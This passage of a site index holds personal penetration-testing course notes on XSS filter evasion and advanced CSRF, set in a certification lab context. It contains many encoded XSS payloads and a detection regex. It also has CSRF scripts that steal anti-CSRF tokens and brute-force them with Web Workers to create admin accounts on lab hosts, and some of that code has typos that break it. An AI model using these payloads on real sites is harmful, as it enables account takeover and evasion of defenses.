onload%0B=alert(1)&gt;  # IE only   Browsers are in continuous evolution; Therefore, some of the chars allowed may not work anymore. So, Shazzer Fuzz DB has created two fuzzer tests:   → http://shazzer.co.uk/vector/Characters-allowed-after-attribute-name   → http://shazzer.co.uk/vector/Characters-allowed-before-attribute-name   To data, a valid regex rule should be the following:  (?i)([\\s\\\"'`;\\/0-9\\=\\x00\\x09\\x0A\\x0C\\0x0D\\x3B\\x2C\\x28\\x3B]+on\\w+[\\s\\x00\\x09\\x0A\\x0C\\0x0D\\x3B\\x2C\\x28\\x3B]*?=)   Keyword Based Filters  There are filters focused on preventing scripting mode such as alert, javascript, eval   Char Escaping  Here we see Unicode Escaping without using native functions:  &lt;script&gt;\\u0061lert(1)&lt;/script&gt; &lt;script&gt;\\u0061\\u006\\u0065\\u0072\\u0074(1)&lt;/script&gt;   Unicode escaping using native functions. Eval is just one of many:  &lt;script&gt;eval(\"\\u0061lert(1)\")&lt;/script&gt; &lt;script&gt;eval(\"\\u0061\\u006\\u0065\\u0072\\u0074\\u0028\\u0031\\u0029\")&lt;/script&gt;   IF the filtered vector is within a string, in addition to Unicode, there are multiple escapses we may adopt:  &lt;img src=x onerror=\"\\u0061lert(1)\"/&gt; &lt;img src=x onerror=\"eval('\\141lert(1)')\"/&gt;     # octal escape &lt;img src=x onerror=\"eval('\\x61lert(1)')\"/&gt;     # hexa escape  &lt;img src=x onerror=\"eval('&amp;#x0061;lert(1)')\"/&gt; # hexa numeric char reference &lt;img src=x onerror=\"eval('&amp;#97;lert(1)')\"/&gt;    # decimal NCR &lt;img src=x onerror=\"eval('\\a\\l\\ert(1\\)')\"/&gt;    # superfluous escapes chars  &lt;img src=x onerror=\"eval('\\u0065val('\\141\\u006c&amp;#101;&amp;#x0072t\\(&amp;#49)')\"/&gt;  ' # All chars escaping can stay together.   Contructing String  Javascript jas several functions useful to create string:  /ale/.source+/rt/.source String.fromCharCode(97,108,101,114,116) atob(\"YWxlcnQ=\") 177985081..toString(36)   Execution Sinks     Technically, functions that parse string as JavaScript code are called execution sinks, and JavaScript offers several alternatives.   Some Sinks:  setTimeout(\"JSCode\") //all browsers setInterval(\"JSCode\") //all browsers setImmediate(\"JSCode\") //IE 10+ Function(\"JSCode\") //all browsers  # moreover: https://code.google.com/p/domxsswiki/wiki/ExecutionSinks   Variation of the Function sink:  [].constructor.constructor(alert(1))                  object       array       function       XSS vector           Pseudo-protocols  javascript: is an unofficional URI scheme, commonly referred as a pseudo-protocol.      javascript followerd by (:) is usually blocked   Example:  &lt;a href=\"javascript:alert(1)\"/&gt;    \" //blocked # javascript: is not needed on event handlers; SO, we should avoid using it.   Bypass examples:  &lt;object data=\"JaVScRiPt:alert(1)\"&gt; &lt;object data=\"javascript&amp;colon;:alert(1)\"&gt; &lt;object data=\"java script:alert(1)\"&gt; &lt;object data=\"javascript&amp;#x003A;alert(1)\"&gt; &lt;object data=\"javascript&amp;#58;alert(1)\"&gt; &lt;object data=\"&amp;#x6A;avascript:alert(1)\"&gt; &lt;object data=\"&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;alert(1)\"&gt;      In addition to javascript:, there are also data: and the IE exclusive vbscript:   Data URI scheme:  data:[&lt;mediatype&gt;][;base64],&lt;data&gt;  # mediatype is usually 'text/html'   If javascript: is blocked:  &lt;object data=\"data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt; &lt;object data=\"data:text/html,base64,&lt;base64 encoded&gt;\"&gt;   If data: is blocked:  &lt;embed code=\"DaTa:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt; &lt;embed code=\"data&amp;colon;text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt; &lt;embed code=\"data&amp;#x003A;text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt; &lt;embed code=\"&amp;#x64;&amp;#x61;ta:text/html,&lt;script&gt;alert(1)&lt;/script&gt;\"&gt;   The vbscript pseudo-protocol is not so common, because it can only be used with IE.      From IE11 in Edge, vbscript is no longer supported.   How to use vbscript:  &lt;img src=a onerror=\"vbscript:msgbox 1\"/&gt; //works till IE8 &lt;img src=b onerror=\"vbs:msgbox 2\"/&gt; //works till IE8 &lt;img src=c onerror=\"vbs:alert(3)\"/&gt;   \"//works till IE Edge &lt;img src=d onerror=\"vbscript:alert(4)\"/&gt;  \"//works till IE Edge   Bypass vbscript:  &lt;img src=x onerror=\"vbscript&amp;#x003A;alert(1)\"/&gt;    \" &lt;img src=x onerror=\"vb&amp;#x63;cript:alert(1)\"/&gt;       \"  &lt;img src=x onerror=\"v&amp;#00;bs&amp;#x00;cri pt:alert(1)\"/&gt; //using NUL bytes   Tool to obfuscate:  http://dennisbabkin.com/screnc/   Bypassing Sanitization   The most common is to HTML-encode such as:  &lt; (&amp;lt;) &gt; (&amp;gt;)   String Manipulations  Example:  removing &lt;script&gt; tag   Removing HTML tags  The check is not performed recursively:  &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; # this could be a bypass   If the filter performs recursive checks, we can still bypass. maybe changing the order of injected strings.  &lt;scr&lt;iframe&gt;ipt&gt;alert(1)&lt;/script&gt; //this could be a bypass      it all depends on the filter that we are facing   → moreover: https://els-cdn.content-api.ine.com/eda3ac9d-554a-469a-98c6-639c90f0c7a5/index.html#   Escaping Quotes     Filters place the backslash char ** before quotes to escape that kind of character   Example:  randomkey\\' alert(1);  # escape the apostrophe randomkey\\\\' alert(1); # escape the backslash   One of useful Javascript methods is:  String.fromCharCode()   It allows us to generate strings starting from a sequence of Unicode values:  String.fromCharCode(120,115,9416)  # u+0078 Latin Small Letter x # u+0073 Latin small Letter s # u+24C8 Circled Latin capital letter (S)   /your string/.source  //space allowed 43804..toString(36)   //spaces not allowed in Base36   Using unescape method:  unescape(/%78%u0073%73/.source) //its deprecated   Using decodeURI and decodeURIComponent:  # in this case, characters needs to be URL-encoded to avoid URI malformed errors  decodeURI(/alert(%22xss%22)/.source) decodeURIcomponent(/alert(%22xss%22)/.source)      These methods could be useful if you can inject into a script or event handler. nut you cannot use quotation marks because they are properly escaped.   Dont forget that each of them will return a string, so you need an execution sink to trigger the code (IE: eval)   Escaping Parentheses     The technique abuses the onerror handler, assigning a function to call once an error has been generated using throw followed by the arguments to the function assigned to the error handler.   → moreover: http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/   &lt;img src=x onerror=\"window.onerror=eval;throw'=alert\\x281\\x29'\"&gt; # eval - function to invoke in case of error # throw - generate the error # alert... - parameters For the error function  onerror=alert;throw 1; // a simple version # does not work in Firefox and IE   And since the arguments section is quoted, its possible to do some encoding like the following:  &lt;img src=x onerror=\"window.onerror=eval;throw'\\u003d&amp;#x006C;ert&amp;#x0028;18#41;'\"/&gt;   Bypassing Browser Filters  They dont cover all possible XSS attacl scenarios and they focus on Reflected type of XSS.   UnFiltered Scenarios - Injecting Inside HTML Tag  &lt;svg/onload=alert(1)&gt; # its detected by all main filters   # Just by removing the final (&gt;) we jave a bypass For browsers with XSSAuditor &lt;svg/onload=alert(1) // works chromium based browser   Injecting inside HTML Tag Attributes:  site.com/inject?x=giuseppe\"&gt;&lt;svg/onload=alert(1)&gt;   We can bypass WebKit with:  site.com/inject?x=giuseppe\"&gt;&lt;a/href=\"data:text/html;base64,&lt;base64 payload&gt;\"&gt;clickhere&lt;!--   Injecting Inside SCRIPT Tag:  site.com/inject?name=belucci\";alert(1);//   Injecting Inside Event Attributes:  site.com/inject?roomID=alert(1)   DOM Based:  site.com/inject?next=javascript:alert(1)      DOM Based, there are other scenarios that are not covered by browsers filters.      For example, fragmented vectors in multiple GET parameters or attacks that are not reflected in the same page, mXSS, etc.    ","categories": ["notes","ewptx"],
        "tags": ["advanced","pentest","web","bypass"],
        "url": "/notes/ewptx/xssfilter/",
        "teaser": "/assets/images/posts/ewptx/ewptx-teaser5.jpg"
      },{
        "title": "5 - Cross-site request forgery (CSRF)",
        "excerpt":"  Cross-Site Request Forgery           CSRF or XSRF occurs when developers omit the prevention mechanisms.            Is the most known flavor of the Session Riding attack category. Its also pronouced Sea Surf            http://seclists.org/bugtraq/2001/Jun/217       Recap     There is nothing wrong with requests such as requiring external hosted images, javascript code, stylesheet, etc.   The wrong part is when these requests are forged in order to send money to the attacker by both performing privilegeda actions and other malicious operations.   CSRF attacks allows one to exploit the trust relationship between a web app and the HTTP requests made by its users.   This forces them to perform arbritary operations on behalf of the attacker   Vulnerable  A web app is vuln to CSRF attacks IF:     When tracking sessions, the application relies both on mechanisms like HTTP cookies and Basic Authentication, which are automatically injected into the request by the browser.   The attacker is able to determine all the required parameters in order to perform the malicious request.   In order to exploit:     Make sure that the victim has a valid and active session when the malicious request is executed.   Be able to forge a valid request on behalf of the victim   Vulnerable Scenarios     When the application lacks anti-CSRF defenses   When the application contains weak anti-CSRF defense mechanisms such as cookie-only based solutions, confirmation screens, using POST, and checking the referer header.      CSRF = an attacker can send a request on behalf of ht victim using their browser, which simply means that the attacker can target any website that is accessible from the victim side.    Attack Vectors   Force Browsing with GET   Change Email Address  Lets say, provide the new address and subit the form      By default the HTTP method is GET   To exploit this vuln, we need to generate a GET request and then trick the victim (or their browser) into executing it.   The simplest method to generate a GET request is to use images. This is merely because Getis the standard method used when requesting an image with HTML      To deliver the attack, we must exploit an existing flaw like XSS, and inject either HTML or Javascript.       Otherwise, we need to social engineer the victim in order to have them visit our malicious page or click a link we provide.    Tags supported by HTML4 and HTML5  http://www.w3.org/TR/REC-html40/index/attributes.html http://www.w3.org/html/wg/drafts/html/master/index.html#attributes-1   REQUIRE User Interaction:  &lt;href=URL&gt;click here &lt;form&gt;&lt;input formaction=URL&gt; &lt;button formaction=URL&gt;   DO NOT REQUIRE User Interaction:  &lt;iframe src=URL&gt; &lt;script src=URL&gt; &lt;input type=\"image\" src=URL alt=\"\"&gt; &lt;embed src=URL&gt; &lt;audio src=URL&gt; &lt;video src=URL&gt; &lt;source src=URL&gt; &lt;video poster=URL&gt; &lt;link rel=\"stylesheet\" href=URL&gt; &lt;object data=URL&gt; &lt;body background=URL&gt; &lt;div style=\"backgound:url(URL)\"&gt; &lt;style&gt;body { background:url(URL) } &lt;/script&gt;   Post Requests  Using only HTML, the only way to forge POST requests is with the attribute method of tah FORM:  &lt;form action=\"somewhere\" method=\"POST\"&gt;           As a result, we need to create a cloned form and then social engineer the victim into clicking the submit button.            We can use HTML + Javascript to create a more effective attack that does not require user interaction       Auto-submitting Form  &lt;script&gt;document.getElementById(\"CSRForm\").submit()&lt;/script&gt;   We can use event handlers such as onload and onerror because they do not require user interaction:  &lt;img src=x onerror=\"CSRForm.submit();\"&gt;   in HTML5 we can use autofocus and the related event handler onfocus:  &lt;input name=\"new\" value=\"evil@hacker.site\" autofocus onfocus=\"CSRForm.submit()\"&gt;   How to perform POST requests silently  &lt;iframe style=\"display:none\" name=\"CSRFrame\"&gt;&lt;/iframe&gt;  # in the form we add target=\"CSRFrame\"  # display the response received submitting the form in the iframe   Can be forged using XMLHttpReques(XHR) also:  var url=\"URL\"; var params = \"old=mycoolemail@victim.site&amp;new=eviL@hacker.site\"; var CSRF = new XMLHttpRequest(); CSRF.open(\"POST\", url, false); CSRF.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); CSRF.send(params)   Can also be done using JavaScript libraries such as JQuery:  $.ajax({ type: \"POST\", url: \"URL\", data: \"old=mycoolemail@victim.site&amp;new=eviL@hacker.site\",});   Exploiting Weak Anti-CSRF Measures   Using POST-only Requests     Get requests can be cached, bookmarked, etc. It should not be used For operations that cause a state to change. These may include functionality like database operations, writings files, etc.   POST requests For sensitive informations is better practice and protects against a well-known class of CSRF attack vectors.   Multi-Step Transactions     As long as we are able to either predict or deduce the steps necessary to complete a task, then CSRF is possible.   IF the app implements multi=step transactions, these are in no way a protection mechanism.   Checking Referer Header     It allows a server to check where a request was orifinated and therefore perform logging, optimized chaching. etc.   Some implementation mistakens are that the referrer not being sent if the website is using SSL/TLS. This does not take into consideration that firewalls, corporate proxies, etc, might remove this header   It can help in detecting some attacks. However, it will not stop all attacks. An example is an XSS flaw in the same origin.   Predicatable Anti-CSRF Token     One of the most effective solutions For reducing the likelihood of CSRF exploitation is to use a Synchronizer Token Pattern, commonly called anti-CSRF Tokens.   This design pattern requires the generating of a challenge token that will be inserted within the HTML page. Another countermeasure might be SameSite Cookie.   Synchronizer Token Pattern: https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html   sameSite Cookie: https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7      its essential that the token values are randomly generated    Unverified Anti-CSRF Token  Another possible scenario is when the application implements strong Anti-CSRF tokens but lacks the verification server-side.   Secret Cookies  The concept with this technique is to create a cookie containing secret information (MD5 hash of a random secret) and then check if its included in the users request.   Clearly, this is not in any way a security measure. Cookies, both by specification and design, are sent with every request. Therefore, once a user sets a cookie, they are passed to the site/app no matter what, regardless of user intention.   Advanced CSRF Exploitation   Bypassing CSRF Defenses with XSS  A single XSS flaw is like a storm that overwhelms the entire CSRF protection system.      Technically, once we have exploited an XSS flaw, we are in the same origin of the CSR. All defenses against CSRF, except Challenge-Response mechanisms, are useless.    Can be Bypassed:  - Synchronized token - Checking the Referer Header - Checking the Origin Header   → https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern   → https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers   → https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#verifying-origin-with-standard-headers   Bypassing Header Checks  Checking Referer and Origin header simply means that the request must come from a proper origin.      Bypassing these types of defenses measures are straightforward as long as we have effectively exploited an XSS vulnerability.    Bypassing Anti-CSRF Token  We need to hijack the anti-csrf token from a valid form and then use the token stolen in our forged form.  # Once the XSS has been detected &gt; Two scenarios: 1 - Occurs when XSS and CSRF-protected forms are contained on the same page 2 - XSS flaw is located in another part of the web application  Steps to bypass anti-CSRF mechanisms:  # Useless if the XSS is in the same page - 1. Request a valid form (with a valid token) - 2. Extract the valid token from the source code - 3. Forge the form with the stolen token   CSRF in 3 Steps   1 - Request a valid form with a valid Token  We need the HTML of the page where the target form is located.      Worst case scenario, the XSS is not located on the same page of the target form; therefore, we can not access the DOM directly using JavaScript. Thus, we need to GET the HTML source of the page.   To get the pages HTML using XMLHttpRequest is simple:   → http://xhr.spec.whatwg.org/   var xhr = new XMLHttpRequest(); xhr.onreadystatechange = function() {   if(xhr.readyState == 4) {     var htmlSource = xhr.responseText; // the source code     // some operations   } } xhr.open('GET','http://victim.site/csrf-form-page.html', true); xhr.send();      The first step is to request a valid form with a valid token by using some form of the following JQuery code:    JReq = JQuery.get('http://victim.site/csrf-form-page.html', function() {   var htmlSource = JReq.responseText; // the source code   // some operations   });   2 - Extract the valid Token from the Source Code  in the best scenario, we can access the DOM quite easily:  var token = document.getElementsByName('csrf_token')[0].value   Whereas, there are multiple options available to both inspect the string result and extract the anti-csrf token.   THe first options is by using regex-based DOMParser API:  https://developer.mozilla.org/en-US/docs/Web/API/DOMParser      3 - Forge the Form with the Stolen Token  Once we have a valid token, is to add the anti-csrf token in the forged form and send the attack by using the techniques we have seen in the previous sections.   Bypassing Anti-CSRF Token Brute Forcing     The Anti-csrf tokens must be random and unpredictable. Otherwise it becomes expose to brute force attacks.   If we are able to steal a vicitms valid cookie, we can use Burp Repeater or custom scripts like Ruby, Python or any other non-browser mechanisms to generate a tremendous number of requests.   Moreover in the video section   In a scenario where we cant steal the victim session cookies:  - Target users might be either convinced to visit our malicious page - We can inject our malicious code and exploit an XSS flaw against these users. - As a result we exploit the weak anti-CSRF protection      Lets consider an implementation that generates anti-CSRF tokens with a number value between 100 and 300. This is a poor leve of randomness, cause we can brute-force it.   Exploiting this only requires us to create a page with a script that generates and submits 200 forms.  - To submit a post we can use a form element - XMLHttpRequest       The implementation requires both a loop, in order to generate the number of requests needed, and a function that generates the same requests (except For the anti-CSRF token)         In some cases, the vuln form may be using GET. We can use XHR again; There are also agreate deal of other native methods (IMG, etc)      Some real-world implementations of anti-CSRF appear to use a known Ajax request to get the token.      If u could iframe that particular functionality, you could narrow down a valid token by leveraging JavaScript and given that each char has a different size.    Video’s Notes   Advanced CSRF Exploitation - parte 1   This is a nice shopping site.  &lt;script type=\"text/javascript\"&gt;  var url = \"http://targeturl.site/add_user.php\"; var params = \"name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=\"; # u can grab this param via BURP  var CSRF=new XMLHttpRequest(); CSRF.open(\"POST\",url, true); CSRF.withCredentials = \"true\"; CSRF.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\"); // u can grab the content-type via BURP CSRF.send(params); &lt;/script&gt;   bypass token  &lt;script type=\"text/javascript\"&gt;  function addUser(token) {   var url = \"http://targeturl.site/add_user.php\";   var params = \"name=Talent&amp;surname=John&amp;email=talent%40site.com&amp;role=ADMIN&amp;submit=&amp;CSRFToken=\" + token;    var CSRF=new XMLHttpRequest();   CSRF.open(\"POST\",url, true);   CSRF.withCredentials = \"true\";   CSRF.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");   CSRF.send(params); }  // extract the token var XHR = new XMLHttpRequest(); XHR.onreadystatechange = function(){   if(XHR.readyState == 4{     var htmlSource = XHR.reponseText; // the source of users      // extract the token     var parser = new DOMParser().parseFromString(htmlSource, \"text/html\");     var token = parser.getElementById(\"CSRFToken\").value;     addUSer(token);   }  }  XHR.open('GET', 'targeturl.site',true); XHR.send();  &lt;/script&gt;   Get token in browser      document.getElementById(‘CSRFToken’).value   Advanced CSRF Exploitation - parte 2      Send the token page in BURP to Sequencer   Run the live test   Save the tokens   in CMD:  sort &lt;token file&gt; // get rid of duplicates sort &lt;token file&gt; | uniq -c //show the most common tokens sort &lt;token file&gt; | uniq -c | nl  sort &lt;token file&gt; | uniq &gt; valid_tokens  cd /var/www nano brutePOST.html   &lt;html&gt; &lt;body&gt;   &lt;textarea id=\"tokens\" row=\"12\" columns=\"60\"&gt;     &lt;copy the valid tokens here&gt;   &lt;/textarea&gt;  &lt;script&gt; function XHRPost(tVal){   var http = new XMLHttpRequest();   var url = \"target.site/add_user.php\";   var token = tVal;   var params = \"POST data from BURP\" //edit the token in the data with the 'token' variable   http.open(\"POST\", url, true);   http.withCredentials = \"true\";   http.setRequestHeader(\"Content-Type\", \"content type from BURP\");   http.onreadystatechange = function(){     if(http.readyState&gt; 1){       //For the SoP we dont care about response       http.abort();    }   # Serialize the param object   queryParams = Object.keys(params).reduce(functions(a,k){     a.push(k + '=' + encodeURIComponent(params[k]));     return a        }, []).join('&amp;');   http.send(queryParams); } function bruteLoop(TList){   For (var i=0; i&lt;TList.length; i++){     XHRPost(Tlist[i]);   } }   // Prepare the token list var tokens = document.getElementById('tokens').value.replace(/\\s+/gm, '\\n').split('\\n'); tokens = tokens.filter(Boolean); # remove empty values  bruteLoop (tokens);  &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;   Test the Referer value     Test with subdomain   Test in the file name text   In this case, we need to change the file name to the target.url   So the referer can recognize as a trusted sender   nivel 2 Brute forcer with Workers  brute.js  self.addEventListener('message', function (e) {     var tokens = e.data.tokens;     function bruteLoop(TList) {       for (var i = 0; i &lt; TList.length; i++) {          console.info(\"Testing: \" + TList[i]);          XHRPost(TList[i]);       }        Terminator();    }     function XHRPost(tVal) {       var http = new XMLHttpRequest();       var url = \"http://{LABID}.csrf.labs/add_user.php\";        var token = tVal;        params = {          \"name\": \"Malice\",          \"surname\": \"Smith\",          \"email\": \"malice@hacker.site\",          \"role\": \"ADMIN\",          \"submit\": \"\",          \"CSRFToken\": token,       };        http.open(\"POST\", url, true);       http.withCredentials = 'true';        // Send the proper header information along with the request       http.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");       http.onreadystatechange = function () {          if (http.readyState &gt; 1) { // We don't care about responses             // console.warn(\"Aborted \" + token + \" with status \" + http.readyState);             // http.abort();          }       };        // Serialize the data without using JQuery        queryParams = Object.keys(params).reduce(function (a, k) {          a.push(k + '=' + encodeURIComponent(params[k]));          return a       }, []).join('&amp;');       http.send(queryParams);    }     function Terminator() {       self.postMessage(\"Sir, I've finished... see you later\");       self.close();       return;    }     // Brute Loop    bruteLoop(tokens);  }, false);     Simple Brute Force  &lt;html&gt;    &lt;body&gt;       &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;       &lt;textarea id=\"tokens\" rows=\"12\" cols=\"60\"&gt;          1679091c5a880faf6fb5e6087eb1b2dc       &lt;/textarea&gt;       &lt;script&gt;          function bruteLoop(TList) {             for (var i = 0; i &lt; TList.length; i++) {                console.info(\"Testing: \" + TList[i]);                XHRPost(TList[i]);             }          }           function XHRPost(tVal) {             var http = new XMLHttpRequest();             var url = \"http://{LABID}.csrf.labs/add_user.php\";             var token = tVal;             params = {                \"name\": \"Malice\",                \"surname\": \"Smith\",                \"email\": \"malice@hacker.site\",                \"role\": \"ADMIN\",                \"submit\": \"\",                \"CSRFToken\": token,             };             http.open(\"POST\", url, true);             http.withCredentials = 'true';              // Send the proper header information along with the request             http.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");              http.onreadystatechange = function () {                if (http.readyState &gt; 1) {                   // We don't care about responses                   // console.warn(\"Aborted \" + token + \" with status \" + http.readyState);                   http.abort();                }             };              // Serialize the data without using JQuery             queryParams = Object.keys(params).reduce(function (a, k) {                a.push(k + '=' + encodeURIComponent(params[k]));                return a             }, []).join('&amp;');             http.send(queryParams);          }           var tokens = document.getElementById('tokens').value.replace(/\\s+/gm, '\\n').split('\\n');          tokens = tokens.filter(Boolean); // Remove empty lines           // Brute Loop          bruteLoop(tokens);       &lt;/script&gt;    &lt;/body&gt; &lt;/html&gt;     brutePOST_worker.html  &lt;html&gt;    &lt;body&gt;       &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;       &lt;textarea id=\"tokens\" rows=\"12\" cols=\"60\"&gt;          00411460f7c92d2124a67ea0f4cb5f85       &lt;/textarea&gt;       &lt;br&gt;       &lt;h1&gt;Workers results&lt;/h1&gt;       &lt;span id=\"workers\"&gt;&lt;/span&gt;        &lt;script&gt;          function startBlock(worker, tokens) {             worker.postMessage({                'tokens': tokens             });          }           var bruterPath = \"csrf.labs.bruter.js\";           var ww1 = new Worker(bruterPath);          ww1.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww1&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var ww2 = new Worker(bruterPath);          ww2.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww2&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var ww3 = new Worker(bruterPath);          ww3.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww3&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var tokens = document.getElementById('tokens').value.replace(/\\s+/gm, '\\n').split('\\n');          tokens = tokens.filter(Boolean);           startBlock(ww1, tokens.slice(0, 333));          startBlock(ww2, tokens.slice(333, 666));          startBlock(ww3, tokens.slice(666, tokens.length));       &lt;/script&gt;        &lt;div&gt;          &lt;img src=\"counter.gif\" /&gt;       &lt;/div&gt;    &lt;/body&gt; &lt;/html&gt;   LAB CSRF   Warm-up: CSRF level 1   warm-up  add the user did with BURP   Easy: CSRF level 2   &lt;script type=\"text/javascript\"&gt; var url = \"http://2.csrf.labs/add_user.php\" var params = \"name=talent&amp;surname=joao&amp;email=talent%40hacker.site&amp;role=ADMIN&amp;submit=\" var csrf = new XMLHttpRequest(); csrf.open(\"POST\", url, true); csrf.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\"); csrf.send(params); &lt;/script&gt;   Easy: CSRF level 3  test2 &lt;script type=\"text/javascript\"&gt; function addUser(token) {     var url = \"http://3.csrf.labs/add_user.php\";     var param = \"name=Malice&amp;surname=Smith&amp;email=malice%40hacker.site&amp;role=ADMIN&amp;submit=&amp;CSRFToken=\" + token;      var CSRF = new XMLHttpRequest();     CSRF.open(\"POST\",url,true);     CSRF.withCredentials = 'true';     CSRF.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");     CSRF.send(param); } // Extract the token var XHR = new XMLHttpRequest(); XHR.onreadystatechange = function() {      if (XHR.readyState == 4 ) {         var htmlSource = XHR.responseText; // the source of users.php         // Extract the token          var parser = new DOMParser().parseFromString(htmlSource, \"text/html\");         var token = parser.getElementById('CSRFToken').value;         addUser(token);     } } XHR.open('GET', 'http://3.csrf.labs/users.php', true); XHR.send();   Medium: CSRF level 4      I had to change the localhost in /etc/hosts value to a subdomain of the target such as: hacker.site.4.csrf.labs So the referer was not blocked    &lt;html&gt;    &lt;body&gt;       &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;       &lt;textarea id=\"tokens\" rows=\"12\" cols=\"60\"&gt;          1679091c5a880faf6fb5e6087eb1b2dc          45c48cce2e2d7fbdea1afc51c7c6ad26          8f14e45fceea167a5a36dedd4bea2543          a87ff679a2f3e71d9181a67b7542122c          c4ca4238a0b923820dcc509a6f75849b          c81e728d9d4c2f636f067f89cc14862c          c9f0f895fb98ab9159f51fd0297e236d          cfcd208495d565ef66e7dff9f98764da          d3d9446802a44259755d38e6d163e820          e4da3b7fbbce2345d7772b0674a318d5          eccbc87e4b5ce2fe28308fd9f2a7baf3       &lt;/textarea&gt;       &lt;script&gt;          function bruteLoop(TList) {             for (var i = 0; i &lt; TList.length; i++) {                console.info(\"Testing: \" + TList[i]);                XHRPost(TList[i]);             }          }           function XHRPost(tVal) {             var http = new XMLHttpRequest();             var url = \"http://4.csrf.labs/add_user.php\";             var token = tVal;             params = {                \"name\": \"Johnny\",                \"surname\": \"praq\",                \"email\": \"john@hacker.site\",                \"role\": \"ADMIN\",                \"submit\": \"\",                \"CSRFToken\": token,             };             http.open(\"POST\", url, true);             http.withCredentials = 'true';              // Send the proper header information along with the request             http.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");             http.onreadystatechange = function () {                if (http.readyState &gt; 1) {// We don't care about responses                   // console.warn(\"Aborted \" + token + \" with status \" + http.readyState);                   http.abort();                }             };              // Serialize the data without using JQuery             queryParams = Object.keys(params).reduce(function (a, k) {                a.push(k + '=' + encodeURIComponent(params[k]));                return a             }, []).join('&amp;');             http.send(queryParams);          }           var tokens = document.getElementById('tokens').value.replace(/\\s+/gm, '\\n').split('\\n');          tokens = tokens.filter(Boolean); // Remove empty lines           // Brute Loop          bruteLoop(tokens);       &lt;/script&gt;    &lt;/body&gt; &lt;/html&gt;    Hard: CSRF level 5  &lt;html&gt;    &lt;body&gt;       &lt;h1&gt;Anti-CSRF Tokens to test&lt;/h1&gt;       &lt;textarea id=\"tokens\" rows=\"12\" cols=\"60\"&gt;          00411460f7c92d2124a67ea0f4cb5f85          # add the tokens       &lt;/textarea&gt;       &lt;br&gt;       &lt;h1&gt;Workers results&lt;/h1&gt;       &lt;span id=\"workers\"&gt;&lt;/span&gt;        &lt;script&gt;          function startBlock(worker, tokens) {             worker.postMessage({                'tokens': tokens             });          }           var bruterPath = \"csrf.labs.bruter.js\";           var ww1 = new Worker(bruterPath);          ww1.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww1&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var ww2 = new Worker(bruterPath);          ww2.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww2&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var ww3 = new Worker(bruterPath);          ww3.addEventListener('message', function (e) {             document.getElementById(\"workers\").innerHTML += \"&lt;b&gt;ww3&lt;/b&gt; says: \" + e.data + \"&lt;br&gt;\";          }, false);           var tokens = document.getElementById('tokens').value.replace(/\\s+/gm, '\\n').split('\\n');          tokens = tokens.filter(Boolean);           startBlock(ww1, tokens.slice(0, 333));          startBlock(ww2, tokens.slice(333, 666));          startBlock(ww3, tokens.slice(666, tokens.length));       &lt;/script&gt;        &lt;div&gt;          &lt;img src=\"counter.gif\" /&gt;       &lt;/div&gt;    &lt;/body&gt; &lt;/html&gt;    JS workers  self.addEventListener('message', function (e) {    var tokens = e.data.tokens;     function bruteLoop(TList) {       for (var i = 0; i &lt; TList.length; i++) {          console.info(\"Testing: \" + TList[i]);          XHRPost(TList[i]);       }       Terminator();    }     function XHRPost(tVal) {       var http = new XMLHttpRequest();       var url = \"http://5.csrf.labs/add_user.php\";        var token = tVal;        params = {          \"name\": \"luffy\",          \"surname\": \"joyboy\",          \"email\": \"luffy@hacker.site\",          \"role\": \"ADMIN\",          \"submit\": \"\",          \"CSRFToken\": token,       };        http.open(\"POST\", url, true);       http.withCredentials = 'true';        // Send the proper header information along with the request       http.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");       http.onreadystatechange = function () {          if (http.readyState &gt; 1) { // We don't care about responses             http.abort();          }       };        // Serialize the data without using JQuery        queryParams = Object.keys(params).reduce(function (a, k) {          a.push(k + '=' + encodeURIComponent(params[k]));          return a       }, []).join('&amp;');       http.send(queryParams);    }     function Terminator() {       self.postMessage(\"macacos me mordam\");       self.close();       return;    }     // Brute Loop    bruteLoop(tokens); }, false);     ","categories": ["notes","ewptx"],
